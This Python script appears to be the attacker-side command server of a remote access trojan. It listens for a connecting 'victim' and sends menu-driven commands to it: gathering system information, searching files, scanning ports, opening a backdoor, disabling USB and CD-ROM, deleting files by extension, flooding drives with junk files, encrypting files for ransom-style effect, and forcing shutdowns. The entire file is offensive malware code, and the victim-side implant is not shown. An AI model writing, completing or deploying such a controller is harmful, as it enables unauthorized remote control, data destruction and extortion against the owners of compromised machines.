import socket
import subprocess , os
import time
#from flask import flash



s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("192.168.1.103",8000))
s.listen(5)
vic,addr=s.accept()
print("Connected To Victim : "+str(addr))
while True:
    try:
        mainMenu=input("(0)test Connection"+"\n"+
                       "(1)Victim System Information"+"\n"+
                       "(2)Malicious Actions"+"\n"+
                       "(3)Attacks"+"\n")
        if mainMenu=="0":
                vic.send(mainMenu.encode())
                data=vic.recv(123456)
                os.system("clear")
                print(data.decode())
        if mainMenu=="1":
            p = True
            while p:
                subMenu=input("(1)IPConfig"+"\n"+
                              "(2)System Info"+"\n"+
                              "(3)Get Drives"+"\n"+
                              "(4)Machine Time"+"\n"+
                              "(5)Back to Main Menu"+"\n")
                subMenu="1"+subMenu
                if subMenu=="15":
                    p=False
                else:
                    vic.send(subMenu.encode())
                    data=vic.recv(123456)
                    print(data.decode())
              
        if mainMenu=="2":
            p = True
            while p:
                subMenu=input("(1)Find File"+"\n"+
                              "(2)Port Scanner"+"\n"+
                              "(3)BackDoor"+"\n"+
                              "(4)Disable CD-ROM"+"\n"+
                              "(5)Disable CD-ROM"+"\n"+
                              "(6)Disable USB"+"\n"+
                              "(7)Disable USB"+"\n"+
                              "(6)BacktoMainsubMenu"+"\n")
                subMenu="2"+subMenu
                
                if(subMenu=="21"):
                    drive=input("Enter Drive Letter:")
                    fileName=input("Enter File Extention:")
                    subMenu=subMenu+"."+drive+"."+fileName
                    vic.send(subMenu.encode())
                    data=vic.recv(123456)
                    print(data.decode())

                if(subMenu=="22"):
                    port=input("Enter Port:")
                    subMenu=subMenu+"."+port
                    vic.send(subMenu.encode())
                    data=vic.recv(123456)
                    print(data.decode())
                
                if subMenu=="26":
                    p=False

                else:
                    vic.send(subMenu.encode())
                    data=vic.recv(123456)
                    print(data.decode())


        if mainMenu=="3":
            p = True
            while p:
                subMenu=input("(1)Delete Files (*.exe,*.jpg,*.txt,*.rar,*.png)"+"\n"+
                              "(2)Generate 1000 Dump Text Files"+"\n"+
                              "(3)Encrypt "+"\n"+
                              "(4)Decrypt "+"\n"+
                              "(5)Restart"+"\n"+
                              "(6)Log Out"+"\n"+
                              "(7)Shut Down"+"\n"+
                              "(8)Alert Message Box"+"\n"+
                              "(9)BacktoMainsubMenu"+"\n")
                subMenu="3"+subMenu
                if(subMenu=="31"):
                    drive=input("Enter Drive Letter:")
                    fileName=input("Enter File Extention:")
                    subMenu=subMenu+"."+drive+"."+fileName
                    vic.send(subMenu.encode())
                    data=vic.recv(123456)
                    print(data.decode())
                if(subMenu=="32"):
                    drive=input("Enter Drive Letter:")
                    fileName=input("Enter Count of Files to Make:")
                    subMenu=subMenu+"."+drive+"."+fileName
                    vic.send(subMenu.encode())
                    data=vic.recv(123456)
                    print(data.decode())
                    
                if(subMenu=="33"):
                    drive=input("Enter Drive Letter:")
                    fileName=input("Enter Extention to Encrypt:")
                    subMenu=subMenu+"."+drive+"."+fileName
                    vic.send(subMenu.encode())
                    data=vic.recv(123456)
                    print(data.decode())
                    
                if(subMenu=="34"):
                    drive=input("Enter Drive Letter:")
                    fileName=input("Enter Extention to Decrypt:")
                    subMenu=subMenu+"."+drive+"."+fileName
                    vic.send(subMenu.encode())
                    data=vic.recv(123456)
                    print(data.decode())
                if subMenu=="39":
                    p=False
                else:    
                    vic.send(subMenu.encode())
                    data=vic.recv(123456)
                    print(data.decode())

    except:
        pass
s.close()



